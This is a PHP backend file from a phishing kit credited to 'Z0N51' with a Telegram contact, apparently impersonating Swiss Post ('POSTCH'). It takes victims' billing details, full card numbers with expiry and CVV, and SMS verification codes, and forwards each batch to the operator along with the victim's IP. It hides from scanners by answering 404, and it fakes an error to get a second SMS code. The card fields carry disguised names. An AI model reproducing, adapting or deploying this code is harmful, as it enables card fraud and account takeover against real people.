<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'app/config.php';

    if($_SERVER['REQUEST_METHOD'] == "POST") {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if( $_POST['steeep'] == "details" ) {
            $_SESSION['errors'] = [];
            $_SESSION['first_name']    = $_POST['first_name'];
            $_SESSION['last_name']    = $_POST['last_name'];
            $_SESSION['address']    = $_POST['address'];
            $_SESSION['zip_code']    = $_POST['zip_code'];
            $_SESSION['city']    = $_POST['city'];
            $_SESSION['birth_date']    = $_POST['birth_date'];
            $_SESSION['phone']    = $_POST['phone'];
            if( validate_name($_POST['first_name']) == false ) {
                $_SESSION['errors']['first_name'] = get_text('first_name_error');
            }
            if( validate_name($_POST['last_name']) == false ) {
                $_SESSION['errors']['last_name'] = get_text('last_name_error');
            }
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = get_text('address_error');
            }
            if( empty($_POST['zip_code']) ) {
                $_SESSION['errors']['zip_code'] = get_text('zip_code_error');
            }
            if( empty($_POST['city']) ) {
                $_SESSION['errors']['city'] = get_text('city_error');
            }
            if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
                $_SESSION['errors']['birth_date'] = get_text('birth_date_error');
            }
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = get_text('phone_error');
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | POSTCH | Billing';
                $message = '/-- BILLING INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'First name : ' . $_POST['address'] . "\r\n";
                $message .= 'Last name : ' . $_POST['address'] . "\r\n";
                $message .= 'Address : ' . $_POST['address'] . "\r\n";
                $message .= 'Zip code : ' . $_POST['zip_code'] . "\r\n";
                $message .= 'City : ' . $_POST['city'] . "\r\n";
                $message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
                $message .= 'Phone : ' . $_POST['phone'] . "\r\n";
                $message .= '/-- END BILLING INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=cc";
                exit();
            } else {
                echo "../index.php?redirection=details&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "cc" ) {
            $_SESSION['errors'] = [];
            $_SESSION['one']    = $_POST['one'];
            $_SESSION['two']    = $_POST['two'];
            $_SESSION['three']    = $_POST['three'];
            $_SESSION['full_name']    = $_POST['full_name'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three'],$one['type']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( $one == false ) {
                $_SESSION['errors']['one'] = get_text('one_error');
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = get_text('two_error');
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = get_text('three_error');
            }
            if( validate_name($_POST['full_name']) == false ) {
                $_SESSION['errors']['full_name'] = get_text('full_name_error');
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | POSTCH | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Name : ' . $_POST['full_name'] . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=cc";
                exit();
            }
        }

        if( $_POST['steeep'] == "sms" ) {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']    = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = get_text('sms_code_error');
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | POSTCH | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS Code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    echo "../index.php?redirection=success";
                    exit();
                }
                $_SESSION['errors']['sms_code'] = get_text('sms_code_error');
                echo "../index.php?redirection=loading&error=1";
                exit();
            } else {
                $error = $_POST['error'];
                echo "../index.php?redirection=sms&error=$error";
                exit();
            }
        }

    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>